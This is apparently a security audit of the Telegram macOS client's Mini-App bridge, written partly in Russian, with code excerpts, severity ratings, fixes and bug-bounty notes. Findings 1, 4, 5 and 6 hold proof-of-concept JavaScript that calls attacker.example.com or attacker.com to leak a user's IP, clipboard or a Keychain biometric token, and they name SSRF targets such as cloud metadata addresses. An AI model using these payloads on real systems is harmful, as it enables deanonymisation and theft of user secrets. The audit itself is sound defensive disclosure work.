# Telegram macOS Security Audit — Mini-App WebView Bridge

**Target:** TelegramMessenger/telegram-macos (open-source, Swift)  
**Files Audited:**  
- `packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift`  
- `Telegram-Mac/Telegram-Mac.entitlements`  
- `Telegram-Mac/Telegram-Sandbox.entitlements`  
- `packages/TelegramLinks/Sources/TelegramLinks/LinkParsing.swift`  
- `packages/PaymentsUI/Sources/PaymentsUI/PaymentsCheckoutController.swift`

---

## Context: Unsandboxed Direct-Download Build

`Telegram-Mac/Telegram-Mac.entitlements`:
```xml
<key>com.apple.security.app-sandbox</key>
<false/>
```

The direct-download (non-App-Store) build runs **without macOS App Sandbox**. The Telegram process has read/write access to the entire user filesystem under the user's UID. This context elevates the severity of all filesystem-related findings below.

The App Store build (`Telegram-Sandbox.entitlements`) is correctly sandboxed.

---

## Finding 1 — CONFIRMED · MEDIUM-HIGH

### `web_app_share_to_story`: Unsolicited Outbound HTTP Request (IP Leak + SSRF)

**File:** `packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift:2105–2158`  
**CVSS estimate:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

#### Description

The `web_app_share_to_story` Mini App API handler fetches the bot-supplied `media_url` from the **user's machine** with no user interaction required and no URL scheme validation:

```swift
case "web_app_share_to_story":
    if let json = json, let mediaUrl = json["media_url"] as? String {
        let _ = (showModalProgress(signal: fetchHttpResource(url: mediaUrl), for: window)
        // HTTP request fires here — before any user consent dialog
```

`fetchHttpResource` (TelegramCore) performs **no scheme validation**:

```swift
// fetchHttpResource — simplified
func fetchHttpResource(url: String, ...) -> Signal<...> {
    // Only: addingPercentEncoding + URL(string:)
    // No scheme check. "file://", "http://", "https://" all accepted.
    guard let url = URL(string: urlString) else { return .never() }
    return MTHttpRequestOperation.data(forHttpUrl: url)  // no scheme filter
}
```

The consent dialog (`StoryPrivacyModalController`) is only shown **after** the fetch completes. If the user dismisses the dialog, the HTTP request has already been made.

#### Attack Scenario

A malicious Telegram bot opens its Mini App and immediately calls:
```javascript
window.Telegram.WebApp.shareToStory(
    "https://attacker.example.com/pixel.png?id=VICTIM_UNIQUE_ID"
);
```

No click is required. The macOS Telegram client:
1. Issues an HTTP GET to `attacker.example.com` from the user's machine
2. Attacker receives the user's **real IP address** (bypasses Telegram proxy)
3. The story upload consent dialog appears; if dismissed, no story is posted — but the request already happened

#### SSRF Extension

Because `media_url` accepts `http://192.168.x.x/...` and similar, an attacker can:
- Probe internal LAN services (router admin pages, printers, dev servers)
- Receive response timing data (port-open vs. closed via progress events)

On the unsandboxed direct-download build, the request is issued with full network access and no firewall imposed by the sandbox.

#### Recommended Fix

Add scheme validation before fetching:
```swift
case "web_app_share_to_story":
    if let json = json, let mediaUrl = json["media_url"] as? String,
       let url = URL(string: mediaUrl),
       let scheme = url.scheme?.lowercased(),
       ["https"].contains(scheme),           // only HTTPS
       !isPrivateOrLocalHost(url.host) {     // block LAN ranges
        let _ = (showModalProgress(signal: fetchHttpResource(url: mediaUrl), ...)
```

Or, alternatively, show the user confirmation **before** issuing the fetch, allowing them to review and reject the URL.

---

## Finding 2c — LOW (macOS parity-gap, найден диффом с iOS)

### `web_app_open_link`: нет allowlist схем на macOS (iOS есть)

**Файл:** `WebpageModalController.swift:1907,1911` → `BrowserHooks.openLink` → `execute(inapp:.external)`.

iOS `web_app_open_link` отбрасывает любую схему кроме `http/https` и server-`allowedProtocols`
(`WebAppController.swift:1398`). macOS **не проверяет схему** — передаёт `url` напрямую в `openLink`.
Проверено по факту, что реально проходит:
- `file://` и `ton://` **заблокированы** в `parseInAppLink` (`LinkParsing.swift:164–173` → `.nothing`) —
  опасного локального чтения/запуска НЕТ.
- Остаётся узкий остаток: кастомная **короткая** схема (`://` до 10-го символа переживает нормализацию
  в `execute`, `InAppLinks.swift:885–893`) доходит до `NSWorkspace.shared.open(url)` **без
  подтверждения** (needConfirm=false при совпадающем host). Это стандартные `tel:`/`maps:`/`facetime:`
  (низкий импакт) или URL-схема уже установленного на машине приложения.

**Severity: LOW** (запуск по короткой схеме, 1 клик, без прямого доступа к файлам). **Fix:** добавить
iOS-подобный allowlist схем (`http`/`https` + `allowedProtocols`) перед `openLink`.

---

## Finding 2 — CONFIRMED · LOW-MEDIUM (кросс-платформенно)

### `web_app_open_tg_link`: Missing User Interaction Gate

**Кросс-платформенная сверка (подтверждено):** асимметрия гейтов одинакова на macOS и iOS —
`web_app_open_link` требует недавний touch (iOS `WebAppController.swift:1405`
`lastTouchTimestamp + 10.0`), а `web_app_open_tg_link` **НЕ требует** (iOS `:1330–1336`
`controller.openUrl(... )` без touch-проверки; macOS `:1917` без `clickCount`). Значит мини-апп может
без взаимодействия пользователя навести его на любую `t.me/<path>`-цель. Цели с собственным
подтверждением (`t.me/socks`, `t.me/proxy` → `showProxyAlert`; `joinchat` → preview) загейтированы на
своём слое, но открытие произвольного бота/канала/`start`-параметра происходит без согласия. Severity
остаётся LOW-MEDIUM (навигация/нуисанс, не прямой слив), но дефект присутствует на обеих Swift-платформах.

**File:** `packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift:1892, 1917`

#### Description

`web_app_open_link` correctly requires a prior user click before opening an external URL:

```swift
case "web_app_open_link":
    if clickCount > 0 {   // requires prior user interaction
        if let url = ..., isTrustedUrl(url) {
            BrowserHooks.shared.openLink(context, url, ...)
        }
    }
    clickCount = 0
```

`web_app_open_tg_link`, which navigates to a `t.me/` path, has **no such guard**:

```swift
case "web_app_open_tg_link":
    if let path_full = json["path_full"] as? String {
        BrowserHooks.shared.openLink(
            context,
            context.meUrlPrefix + "\(path_full.hasPrefix("/") ? String(path_full.dropFirst()) : path_full)",
            self.window, false,
            { [weak self] in self?.closeAnyway() }
        )
    }
    // No clickCount check
```

#### Impact

Any Mini App can programmatically open arbitrary `t.me/` links (channels, bots, invite links, `t.me/+HASH` invite links) **without user interaction**. This enables:
- Silently joining users to invite-only channels (requires user confirmation at the Telegram level, but the navigation is triggered automatically)
- Redirecting users to attacker-controlled bots mid-session
- Closing the current Mini App (`closeAnyway()`) and opening a phishing bot

#### Recommended Fix

```swift
case "web_app_open_tg_link":
    if clickCount > 0 {   // add the same guard as web_app_open_link
        if let path_full = json["path_full"] as? String {
            BrowserHooks.shared.openLink(...)
        }
    }
    clickCount = 0
```

---

## Finding 3 — MITIGATED (noted for completeness)

### `web_app_request_file_download`: Bot-Controlled `fileName` Passed to TempBox

**File:** `packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift:2164–2184, 2685`

The bot-supplied `file_name` parameter is passed directly to `TempBox.shared.tempFile(fileName: fileName)`. However, `TempBox.sanitizedTempBoxFileName` (in TelegramCore/Postbox) **replaces `/` with `_` and leading `..` with `__`**, preventing path traversal out of the temp directory.

The subsequent `savePanel(file:named:for:)` uses an `NSSavePanel`, which requires explicit user confirmation for the save path.

**Status:** Not exploitable with current TempBox implementation.

---

## Summary Table

| # | Finding | Severity | Status | File |
|---|---------|----------|--------|------|
| 1 | `web_app_share_to_story` IP leak + SSRF | MEDIUM-HIGH | CONFIRMED | `WebpageModalController.swift:2116` |
| 2 | `web_app_open_tg_link` missing click gate | LOW-MEDIUM | CONFIRMED | `WebpageModalController.swift:1917` |
| 3 | File download `fileName` path traversal | N/A | MITIGATED | `WebpageModalController.swift:2685` |
| 4 | JS-Bridge Hijacking (`sameOrigin == false`) | CRITICAL | CONFIRMED | `WebpageModalController.swift:1271,1621,1695,2892` |
| 5 | Biometric Auth bypass (`accessGranted` missing) | HIGH | CONFIRMED | `WebpageModalController.swift:2015,2055` |
| 5b | Biometry Keychain item not account-scoped (cross-account leak) | MEDIUM | CONFIRMED | `WebpageModalController.swift:2035,2073` |
| 6 | `web_app_request_file_download` zero-click size probe (IP leak + SSRF) | MEDIUM-HIGH | CONFIRMED | `WebpageModalController.swift:2169` → `FileDownload.swift:45` |

---

## Finding 4 — CRITICAL

### JS-Bridge Hijacking via Navigation Bypass на legacy Mini-Apps (`sameOrigin == false`)

**Файлы:**  
- `WebpageModalController.swift:1271–1310` (инъекция JS-прокси)  
- `WebpageModalController.swift:1602–1624` (навигационная политика)  
- `WebpageModalController.swift:1691–1708` (проверка доверия сообщений)  
- `WebpageModalController.swift:2892–2901` (обратная передача событий в WebView)  
**CVSS estimate:** 8.1 (AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N)

#### Три уязвимых компонента в связке

**Компонент A — JS-прокси без проверки origin (legacy-путь):**

```swift
// Строка 1271–1310
if let requestData, requestData.sameOrigin {
    // БЕЗОПАСНЫЙ путь: прокси регистрируется только если window.location.origin == trustedOrigin
    let userScript = WKUserScript(source: webAppSecuredEventProxySource(trustedOrigin: trustedOrigin), ...)
} else {
    // УЯЗВИМЫЙ путь: прокси регистрируется для ЛЮБОЙ страницы без проверки origin
    let userScript = WKUserScript(source: js, injectionTime: .atDocumentStart, forMainFrameOnly: true)
}
```

Скрипт `js`:
```javascript
var TelegramWebviewProxyProto = function() {};
TelegramWebviewProxyProto.prototype.postEvent = function(eventName, eventData) {
    window.webkit.messageHandlers.performAction.postMessage({'eventName': eventName, 'eventData': eventData});
};
var TelegramWebviewProxy = new TelegramWebviewProxyProto(); // нет проверки origin
```

**Компонент B — навигационная политика разрешает ВСЕ нажатые не пользователем переходы:**

```swift
// Строка 1621–1623
} else {
    decisionHandler(.allow)  // JS-редирект, meta refresh, HTTP 302 — всё пропускается
}
```

**Компонент C — `isTrustedMainFrameMessage` доверяет ЛЮБОМУ сообщению от main frame:**

```swift
// Строка 1695–1696
guard self.requestData?.sameOrigin == true else {
    return true  // sameOrigin == false → любое сообщение из main frame TRUSTED
}
```

И в обратную сторону:
```swift
// Строка 2892–2897
public func sendEvent(name: String, data: String?) {
    if self.requestData?.sameOrigin == true {
        guard let trustedOrigin = ..., webAppOrigin(url: currentUrl) == trustedOrigin else {
            return  // защита только для sameOrigin == true
        }
    }
    // для sameOrigin == false: данные уходят на ЛЮБУЮ страницу в WebView
```

#### Полная цепочка атаки

```
[Легитимный бот] открывает mini-app с sameOrigin==false
        │
        ▼
[mini-app страница] делает программный редирект:
    window.location.href = "https://attacker.com/bridge_hijack"
        │
        ▼
[Навигационная политика] type != .linkActivated → decisionHandler(.allow)
        │
        ▼
[WKWebView] загружает attacker.com
        │
        ▼
[WKUserScript .atDocumentStart] регистрирует TelegramWebviewProxy для attacker.com
        │
        ▼
[attacker.com JS] вызывает bridge API без ограничений:
    TelegramWebviewProxy.postEvent("web_app_share_to_story",
        JSON.stringify({media_url: "https://attacker.com/ip_log"}))
    // Утечка IP — без взаимодействия пользователя

    TelegramWebviewProxy.postEvent("web_app_request_phone", null)
    // Диалог "поделиться номером" — пользователь думает, что это Бот X

    TelegramWebviewProxy.postEvent("web_app_request_write_access", null)
    // "Разрешить Боту X отправлять сообщения?" — результат идёт на attacker.com

    TelegramWebviewProxy.postEvent("web_app_open_tg_link",
        JSON.stringify({path_full: "/attacker_phishing_channel"}))
    // Редирект на фишинговый канал — без нажатия
        │
        ▼
[isTrustedMainFrameMessage] sameOrigin==false → return true → TRUSTED
[sendEvent] sameOrigin==false → данные уходят на attacker.com
```

#### Почему это CRITICAL, а не просто HIGH

1. **Масштаб**: все mini-apps, созданные до введения `sameOrigin == true`, работают в уязвимом режиме. Это большинство из тысяч существующих ботов.

2. **Для эксплуатации не нужен XSS**: достаточно HTTP 302-редиректа с сервера mini-app (server-side open redirect), либо штатной логики самого бота. Если бот скомпрометирован на уровне сервера — полная компрометация пользователя через bridge.

3. **Доверие пользователя обмануто (UI-origin confusion)**: все диалоги согласия в мосте атрибутируются `requestData.bot` (оригинальный доверенный бот) и действуют на его `id`. Под навигационным байпасом код в WebView — это `attacker.com`, но пользователь видит «Бот X» в заголовке и в тексте диалогов (phone / write_access / emoji_status / biometry). Это повышает шанс одобрения.

#### Точная область слива через канал результатов (`sendEvent`) при `sameOrigin == false`

Проверено по коду, что именно утекает на `attacker.com` (важно не переоценивать):

| Событие | Что передаётся | Реальный риск под Finding 4 |
|---|---|---|
| `phone_requested` | **только** `{status: "sent"/"cancelled"}` | Номер уходит легитимному боту через мессенджер (`shareAccountContact`, `WebpageModalController.swift:2746`), **не** на attacker.com. Атакующий лишь триггерит диалог «Бот X» и узнаёт факт отправки. PII напрямую не утекает. |
| `write_access_requested` | **только** `{status: "allowed"/"cancelled"}` | Право писать получает легитимный бот (`data.bot.id`), не атакующий. |
| `biometry_auth_requested` | `{status, token}` — **реальный токен из Keychain** (`WebpageModalController.swift:2097`) | **ПРЯМОЙ СЛИВ**: токен, сохранённый легитимным ботом, доставляется на `attacker.com`. См. Finding 5. |
| `clipboard_text_received` | `{data: <содержимое буфера обмена>}` (`sendClipboardTextEvent`, `:1682–1687`) | **ПРЯМОЙ СЛИВ для attach-menu/whitelisted ботов**: гейт (`isAttachMenu \|\| attachMenuBot != nil \|\| isWhiteListedBot` + клик ≤10с, `:1769–1774`) проверяет статус **оригинального** бота; attach-menu боты как раз `sameOrigin==false`. После редиректа attacker.com проходит гейт и получает буфер (пароли/2FA/крипто-адреса). |
| `custom_method_invoked` | ответ сервера бота | Утечка ответа кастом-метода на attacker.com. |

**Вывод:** главная ценность захвата для атакующего — не триггер диалогов (бот-получатель фиксирован), а **канал результатов**: биометрический токен и буфер обмена уходят на `attacker.com`, потому что `sendEvent` при `sameOrigin==false` шлёт данные на текущую (подменённую) страницу.

#### Исправление

**Клиентская сторона** (не зависит от сервера):
```swift
// В isTrustedMainFrameMessage: убрать исключение для sameOrigin==false
private func isTrustedMainFrameMessage(_ message: WKScriptMessage) -> Bool {
    guard message.frameInfo.isMainFrame else { return false }
    // УДАЛИТЬ: guard self.requestData?.sameOrigin == true else { return true }
    guard let trustedOrigin = self.trustedOrigin else { return false }
    guard webAppOrigin(securityOrigin: message.frameInfo.securityOrigin) == trustedOrigin else { return false }
    ...
}

// В webAppSecuredEventProxySource: всегда использовать origin-aware инъекцию
if let requestData, requestData.sameOrigin {
    ...
} else {
    // Тоже использовать webAppSecuredEventProxySource с origin из requestData.url
    let userScript = WKUserScript(source: webAppSecuredEventProxySource(trustedOrigin: legacyOrigin), ...)
}

// В навигационной политике: запретить переход в другой origin
} else {
    if let newUrl = navigationAction.request.url,
       let currentUrl = URL(string: self.url),
       webAppOrigin(url: newUrl) != webAppOrigin(url: currentUrl) {
        decisionHandler(.cancel)  // блокировать навигацию в другой origin
    } else {
        decisionHandler(.allow)
    }
}
```

---

## Finding 5 — HIGH

### `web_app_biometry_update_token` / `web_app_biometry_request_auth`: Обход проверки `accessGranted`

**Файл:** `packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift:2015–2104`  
**CVSS estimate:** 7.1 (AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N)

#### Описание

Telegram Bot Platform предоставляет API биометрической аутентификации для Mini Apps. Правильный flow требует явного согласия пользователя:

1. `web_app_biometry_request_access` — показывает диалог "Разрешить боту X использовать биометрию?" → устанавливает `biometryState.accessGranted = true`
2. `web_app_biometry_update_token` — сохраняет токен в Keychain (ДОЛЖНО требовать `accessGranted`)
3. `web_app_biometry_request_auth` — читает токен из Keychain через TouchID (ДОЛЖНО требовать `accessGranted`)

Однако ни `web_app_biometry_update_token`, ни `web_app_biometry_request_auth` **не проверяют `biometryState.accessGranted`**:

```swift
// Строка 2015 — web_app_biometry_update_token
case "web_app_biometry_update_token":
    guard let botPeer = requestData?.bot, var biometryState = self.biometryState else {
        return
    }
    // НЕТ ПРОВЕРКИ: biometryState.accessGranted НЕ проверяется!
    if let json = json, let token = json["token"] as? String {
        let secQuery: NSMutableDictionary = [
            kSecClass: kSecClassGenericPassword,
            kSecAttrAccessControl: sacObject!,
            kSecAttrService: "TelegramMiniApp",
            kSecAttrAccount: "bot_id_\(botPeer.id.toInt64())"
        ]
        // SecItemAdd вызывается БЕЗ проверки accessGranted
        let resultCode = SecItemAdd(secQuery as CFDictionary, nil)

// Строка 2055 — web_app_biometry_request_auth
case "web_app_biometry_request_auth":
    guard let botPeer = requestData?.bot, var biometryState = self.biometryState else {
        return
    }
    // НЕТ ПРОВЕРКИ: biometryState.accessGranted НЕ проверяется!
    DispatchQueue.global().async {
        var itemCopy: CFTypeRef?
        let resultCode = SecItemCopyMatching(secQuery, &itemCopy)
        // SecItemCopyMatching запускает системный TouchID/пароль диалог
```

Для сравнения — `web_app_biometry_request_access` корректно проверяет флаг:
```swift
// Строка 2000 — ПРАВИЛЬНЫЙ guard
if biometryState.accessGranted {
    self.sendBiometricInfo(biometryState: biometryState)
    return
}
// затем показывает диалог пользователю
```

#### Сценарий атаки (standalone)

Новый злоумышленный бот, которому пользователь ни разу не давал биометрическое разрешение:

```
[Мини-апп злоумышленника] открывается
        │
        ▼
JS вызывает:
    TelegramWebviewProxy.postEvent("web_app_biometry_update_token",
        JSON.stringify({token: "attacker_bait"}))
        │
        ▼  
[Swift] SecItemAdd() — записывает токен в Keychain БЕЗ разрешения
        │             biometryState.accessGranted всё ещё FALSE
        ▼
JS вызывает:
    TelegramWebviewProxy.postEvent("web_app_biometry_request_auth", null)
        │
        ▼
[macOS] Показывает системный диалог:
        "Введите Touch ID для разблокировки Keychain"
        — пользователь видит generic системный prompt,
          не понимает кто и зачем запрашивает
        │
        ▼
[Пользователь] аутентифицируется через TouchID
        │
        ▼
[Мини-апп] получает "attacker_bait" обратно
        → доказывает: пользователь за компьютером, Touch ID сработал
```

**Результат**: Бот может скрытно проверить доступность биометрии и "обучить" пользователя на routine биометрические подтверждения без его явного согласия через Telegram UI.

#### Усиленный сценарий (в связке с Finding 4)

После захвата JS-bridge через `sameOrigin == false` navigation bypass:

```
[attacker.com загружен в WebView] — захват bridge из Finding 4
        │
        ▼
attacker.com JS знает bot_id легитимного бота (из requestData)
Легитимный бот ранее хранил чувствительный сессионный токен
        │
        ▼
TelegramWebviewProxy.postEvent("web_app_biometry_request_auth", null)
        │
        ▼
[macOS] TouchID диалог — UI показывает "Разблокировать для [Бот X]"
        │
        ▼
[Пользователь] думает что это Бот X запрашивает, аутентифицируется
        │
        ▼
[Swift] SecItemCopyMatching() читает Keychain-токен ЛЕГИТИМНОГО бота
sendEvent("biometry_auth_requested", {status: "authorized", token: "SENSITIVE_SESSION_TOKEN"})
        │
        ▼
[attacker.com] получает чувствительный токен легитимного бота!
```

Уязвимость позволяет: при активации Finding 4 (для бота с `sameOrigin == false`) похитить сессионный токен легитимного бота из Keychain через обман пользователя при биометрической аутентификации.

#### Почему это HIGH, а не MEDIUM

1. **Нет защиты на уровне Telegram**: пользователь никогда явно не разрешал боту доступ к биометрии через Telegram UI — но TouchID диалог всё равно появляется.
2. **Системный диалог вводит в заблуждение**: macOS показывает generic "Touch ID required" — пользователь не может определить, кто именно инициировал запрос.
3. **Amplification через Finding 4**: в связке с bridge hijacking позволяет похитить Keychain-токены легитимных ботов после успешной биометрической аутентификации.
4. **Нет user interaction required для записи**: `web_app_biometry_update_token` пишет в Keychain полностью автоматически, без какого-либо пользовательского взаимодействия.

#### Рекомендуемое исправление

```swift
// В ОБОИХ обработчиках добавить guard accessGranted:
case "web_app_biometry_update_token":
    guard let botPeer = requestData?.bot, var biometryState = self.biometryState else { return }
    guard biometryState.accessGranted else {  // ← ДОБАВИТЬ
        sendEvent(name: "biometry_token_updated", data: "{status: \"failed\"}")
        return
    }
    // ... остальной код

case "web_app_biometry_request_auth":
    guard let botPeer = requestData?.bot, var biometryState = self.biometryState else { return }
    guard biometryState.accessGranted else {  // ← ДОБАВИТЬ
        let eventData: JSON = ["status": "failed"]
        sendEvent(name: "biometry_auth_requested", data: eventData.string)
        return
    }
    // ... остальной код
```

### Finding 5b — MEDIUM (связанный, найден кросс-платформенным диффом): Keychain-итем биометрии НЕ scoped по Telegram-аккаунту

**Файл:** `WebpageModalController.swift:2031–2036` (запись), `:2067–2074` (чтение).

Keychain-запрос биометрии на macOS использует:
```swift
kSecAttrService: "TelegramMiniApp",
kSecAttrAccount: "bot_id_\(botPeer.id.toInt64())"   // ← только botId, БЕЗ Telegram-аккаунта
```
То есть на одном устройстве с **несколькими Telegram-аккаунтами** секрет бота **общий для всех аккаунтов**:
1. Бот X под аккаунтом A сохраняет токен (`web_app_biometry_update_token`).
2. Пользователь переключается на аккаунт B и открывает мини-апп того же бота X.
3. `web_app_biometry_request_auth` (к тому же без `accessGranted`, см. выше) читает `bot_id_<X>` →
   возвращает **токен аккаунта A** в мини-апп, работающий под аккаунтом B.

**Асимметрия с iOS И Android (эталоны):** iOS использует keyId `A<accountId>WebBot<botId>`
(`WebAppController.swift:2620, 2695`); Android хранит токен в `getSharedPreferences(PREF + currentAccount)`
(`BotBiometry.java:95`) — **обе платформы scoped по аккаунту**, причём Android ещё и гейтит запись
биометрией (CryptoObject cipher). macOS — единственный, кто не привязывает к аккаунту → упущение, не замысел.
Device storage (`setBotStorageValue`) и secure storage (`WebAppSecureStorage`, uuid per-account) на
macOS **scoped** через postbox/uuid — дыра именно в биометрии.

**Impact:** cross-account утечка биометрически-защищённого секрета бота в пределах одного устройства.
**Fix:** включить Telegram account id в `kSecAttrAccount`, напр.
`"acc_\(context.peerId.toInt64())_bot_\(botPeer.id.toInt64())"`, как на iOS.

---

## Finding 6 — MEDIUM-HIGH

### Zero-click исходящий запрос через `web_app_request_file_download` (утечка IP + SSRF, до согласия)

**Файлы:**
- `packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift:2164–2184`
- `packages/FoundationUtils/Sources/FoundationUtils/FileDownload.swift:45–75`
**CVSS estimate:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

#### Описание

Это **тот же класс, что и Finding 1**, но через другой обработчик и другой сетевой стек — показывает, что проблема носит характер паттерна, а не единичного упущения.

Обработчик `web_app_request_file_download` при получении события **сразу** запрашивает размер файла по бот-контролируемому URL, ещё **до** показа диалога подтверждения загрузки:

```swift
// WebpageModalController.swift:2164
case "web_app_request_file_download":
    if let json = json, let url = (json["url"] as? String), let fileName = json["file_name"] as? String {
        if let bot = bot {
            if #available(macOS 10.15, *) {
                let _ = (FileDownload.getFileSize(url: url)          // ← СЕТЕВОЙ ЗАПРОС СРАЗУ
                         |> deliverOnMainQueue).start(next: { [weak self] fileSize in
                    ...
                    downloadFile(url: url, fileName: fileName, ...)  // диалог подтверждения ПОЗЖЕ
                })
            }
        }
    }
```

`FileDownload.getFileSize` не валидирует схему URL и шлёт HEAD-запрос напрямую через системный `URLSession.shared`:

```swift
// FileDownload.swift:45
public static func getFileSize(url: String) -> Signal<Int64?, NoError> {
    if #available(macOS 14.0, *) {
        guard let url = URL(string: url) else { return .single(nil) }   // нет проверки схемы
        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        return Signal { subscriber in
            let task = URLSession.shared.dataTask(with: request) { ... } // прямой запрос, НЕ через прокси Telegram
            task.resume()
            ...
        }
    } else {
        return .single(nil)
    }
}
```

Ключевые свойства дефекта:
1. **Нет гейта `clickCount`/`attachMenuBot`/whitelist** — любой мини-апп, открытый пользователем, срабатывает без взаимодействия.
2. **Нет валидации схемы** — `http://`, `https://`, `file://`, URL на внутренние IP (LAN) принимаются.
3. **`URLSession.shared` напрямую** — запрос идёт по системной сети, **минуя in-app SOCKS/MTProxy Telegram**. Пользователь, специально настроивший прокси в Telegram для сокрытия IP, всё равно раскрывает реальный адрес.
4. **Запрос до согласия** — диалог `verifyAlert` в `downloadFile` показывается только ПОСЛЕ завершения HEAD-запроса.

#### Сценарий атаки (простыми словами, по шагам)

1. Жертва открывает мини-апп бота-злоумышленника (один тап — обычное действие, напр. «играть», «открыть магазин»).
2. JS мини-аппа мгновенно вызывает:
   ```javascript
   window.Telegram.WebApp.downloadFile({
       url: "https://attacker.example/probe.bin?id=VICTIM_123",
       file_name: "update.bin"
   });
   ```
3. Клиент macOS **без какого-либо диалога** шлёт HEAD-запрос на `attacker.example` прямо с машины жертвы.
4. Злоумышленник получает **реальный IP** жертвы (даже при включённом в Telegram прокси) + отпечаток времени.
5. Диалог «Скачать update.bin?» появляется только потом — жертва может его отклонить, но запрос уже ушёл.

#### Расширение SSRF

Поскольку схема/хост не проверяются, `url = "http://192.168.1.1/"` или `http://169.254.169.254/...` (облачные метаданные) заставляет клиента зондировать внутренние сервисы. Через наличие/отсутствие заголовка `Content-Length` в ответе (возвращается в сигнал как размер файла, который затем показывается боту в тексте диалога) злоумышленник получает частичный оракул о доступности и размере внутренних ресурсов. На unsandboxed direct-download сборке сетевых ограничений песочницы нет.

#### Рекомендуемое исправление

```swift
public static func getFileSize(url: String) -> Signal<Int64?, NoError> {
    guard let parsed = URL(string: url),
          let scheme = parsed.scheme?.lowercased(), scheme == "https",
          let host = parsed.host, !isPrivateOrLocalHost(host) else {
        return .single(nil)
    }
    // ... + сам HEAD-запрос выполнять только ПОСЛЕ подтверждения пользователя
}
```

Либо показывать диалог подтверждения (`downloadFile`) **до** вызова `getFileSize`, передавая размер уже после согласия.

---

## Раздел A — Анализ абьюз-поверхности по идентификатору (телефон / юзернейм / TG ID)

**Вопрос threat-model:** может ли атакующий, зная лишь телефон / юзернейм / TG ID жертвы, через **этот macOS-клиент** совершить действие против её воли — блокировку, ограничение, удаление аккаунта/контента, принудительное добавление куда-либо?

**Вывод: НЕТ на уровне клиента.** Все операции, принимающие идентификатор, — это вызовы серверного API; полномочие и энфорс приватности/анти-абьюза находятся на сервере Telegram. Ниже — что проверено и где стоят клиентские гейты. Это защитный (негативный) результат: подтверждает, что харднинг здесь серверный, и фиксирует клиентские места, которые стоит сохранять/усиливать.

### A.1 Резолв по телефону/юзернейму — приватность энфорсится сервером
`InAppLinks.swift:1148–1206` (`resolvePeerByPhone` / `resolvePeerByName`):
- Клиент лишь отправляет идентификатор; сервер возвращает пир **только если приватность цели это позволяет**, иначе `nil` → алерт «пользователь не существует» (`strings().alertUserDoesntExists`).
- Никаких дополнительных данных о privacy-защищённой цели клиент не получает и не показывает. **Деанона на клиенте нет.**
- Результат резолва — максимум открытие чата/профиля; это не действие «против воли» цели.

### A.2 `importContactToken` — согласие цели встроено в механизм
`InAppLinks.swift:1209–1219`: поток `t.me/contact/<token>` работает по токену, который **сама цель сгенерировала и расшарила** (функция «добавить меня без показа номера»). Инициатива и согласие — на стороне цели.

### A.3 Report-флоу — подтверждение пользователя + серверное взвешивание
- `reportPeer` огорожен `verifyAlertSignal` (явный диалог) — `ChatController.swift:7775`.
- `reportPeerMessages` вызывается только из явных пунктов меню «Пожаловаться»/«Пожаловаться и заблокировать», по пиру/сообщению **текущего** чата (`ChatMessageMenuItems.swift:700`, `PeerMediaController.swift:1760`, `DeleteGroupMessagesController.swift:872`).
- **В клиенте нет API «пожаловаться по произвольному ID»** и нет пакетного репорта — то есть клиент не является примитивом для скриптового массового репорта. Вес жалоб определяет сервер.

### A.4 Добавление в группу / звонок — серверная проверка приватности + выбор из пикера
`ChannelBotAdminController.swift:19,528`, `GroupCallInvitation.swift:517` (`addGroupMember`): `memberId` берётся из пира, выбранного пользователем в пикере контактов/участников, а не из произвольно введённого ID жертвы. Возможность добавления цели контролируется её настройкой приватности на сервере (клиент не может переопределить).

### A.5 Удаление контакта — затрагивает только своё адресное
`UserInfoEntries.swift:797–802`, `StoryViewersModalController.swift:863` (`deleteContactPeerInteractively`) удаляет контакт **из своего** списка; на аккаунт цели не влияет.

### Рекомендации по сохранению/усилению (defensive)
1. **Сохранить обязательное подтверждение** на всех report-действиях (сейчас есть) и не добавлять «тихих» или пакетных report-API в клиент.
2. **Не вводить** клиентских действий, принимающих «сырой» телефон/ID жертвы и выполняющих что-либо, кроме открытия чата/профиля, без серверной проверки согласия.
3. Для резолва — продолжать отдавать единый ответ «не существует» при privacy-блоке (сейчас так), чтобы не создавать оракул существования аккаунта на клиенте.

> Примечание: серверные механизмы (анти-флуд, взвешивание жалоб, энфорс приватности) в этом репозитории отсутствуют и аудиту здесь не подлежат. Клиент-сайд вывод — харднинг против вреда по идентификатору обеспечивается сервером, клиент его не ослабляет.

---

## Раздел B — Квалификация по правилам Telegram Bug Bounty

Оценка каждой находки против правил `core.telegram.org/bug-bounty`. Ключевой критерий eligibility: **дефект на стороне Telegram** (клиент open-source, в скоупе), приводит к изменению кода/конфигурации, воспроизводим, **не** попадает в non-qualifying список (фишинг/спам, hijack токена ВНЕШНИМ malware, root/физдоступ, clickjacking, социнженерия, DoS, SSL-практики).

| # | Квалификация | Tier | Риск дисквалификации / как подавать |
|---|---|---|---|
| **4** JS-Bridge Hijacking | **Да** (сильнейшая) | app-level, верх | Это дефект **клиента** (мост доверяет любому origin при `sameOrigin==false`), а не «вредонос на ОС» (п.2) и не clickjacking. Бот-посредник не выводит из скоупа: уязвимость на стороне Telegram. **Подавать как origin-confusion клиента**, слив буфера/токена — следствие бага моста, НЕ «кража внешним malware». |
| **5** Biometry `accessGranted` | **Да** | app-level | Access-control баг Keychain-записи/чтения в клиенте. **НЕ формулировать как «кража токена»** (иначе п.2) — это «отсутствие проверки разрешения перед Keychain-операцией». |
| **1** `share_to_story` IP-leak/SSRF | **Да** | app-level | Утечка реального IP (деанон) + SSRF в LAN — security impact, не DoS. Открытие мини-аппа = штатное действие, **не социнженерия** (п.9). |
| **6** `file_download` size-probe | **Да** | app-level | Тот же класс, что #1, другой обработчик/стек. Отметить ограничение macOS 14+. |
| **2** `open_tg_link` без клика | **Спорно/низко** | возможно вне скоупа | Открытие произвольных `tg://` без клика граничит с «спам/нуисанс» (п.1). Подавать как вспомогательный к #4, не самостоятельно. |
| **3** path traversal | **Нет** | — | MITIGATED (`sanitizedTempBoxFileName`). Не подавать. |
